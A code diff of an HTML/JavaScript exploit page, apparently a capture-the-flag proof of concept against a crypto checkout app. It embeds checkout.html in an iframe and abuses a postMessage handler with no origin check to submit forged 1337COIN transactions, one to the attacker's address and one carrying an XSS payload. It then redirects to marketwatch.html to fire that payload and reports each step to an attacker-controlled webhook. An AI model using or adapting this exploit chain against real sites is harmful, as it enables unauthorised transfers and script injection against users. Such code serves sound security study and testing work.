@@ -14,40 +14,41 @@ const f = document.getElementById('f');
 f.onload = () => {
   fetch(`${WEBHOOK}/?step=iframe_loaded`);
 
-  // Transaction 1: Send 2 1337COIN to YOUR address
-  f.contentWindow.postMessage({
-    type: 'submitTransaction',
-    transaction: {
-      toAddress: YOUR_ADDRESS,
-      currency: '1337COIN',
-      amount: 2
-    }
-  }, '*');
-
-  // Wait, then Transaction 2: Send 2 1337COIN to XSS payload
+  // Wait for checkout.html to fully load wallets (init() is async)
   setTimeout(() => {
+    // Transaction 1: Send 2 1337COIN to YOUR address
     f.contentWindow.postMessage({
       type: 'submitTransaction',
       transaction: {
-        toAddress: XSS_PAYLOAD,
+        toAddress: YOUR_ADDRESS,
         currency: '1337COIN',
         amount: 2
       }
     }, '*');
-    fetch(`${WEBHOOK}/?step=both_tx_sent`);
+    fetch(`${WEBHOOK}/?step=tx1_sent`);
 
-    // Redirect to marketwatch after transactions
+    // Transaction 2: Send 2 1337COIN to XSS payload
     setTimeout(() => {
-      fetch(`${WEBHOOK}/?step=redirecting`);
-      window.location = `${BASE}/marketwatch.html`;
+      f.contentWindow.postMessage({
+        type: 'submitTransaction',
+        transaction: {
+          toAddress: XSS_PAYLOAD,
+          currency: '1337COIN',
+          amount: 2
+        }
+      }, '*');
+      fetch(`${WEBHOOK}/?step=tx2_sent`);
+
+      // Redirect to marketwatch after transactions
+      setTimeout(() => {
+        fetch(`${WEBHOOK}/?step=redirecting`);
+        window.location = `${BASE}/marketwatch.html`;
+      }, 1000);
     }, 1000);
-  }, 500);
+  }, 2000); // Wait 2 seconds for init() to complete
 };
 
-// Track: Admin visited PoC
 fetch(`${WEBHOOK}/?step=started`);
-
-// Open checkout.html in iframe (has postMessage vuln, no origin check)
 f.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
 </script>
 </body>
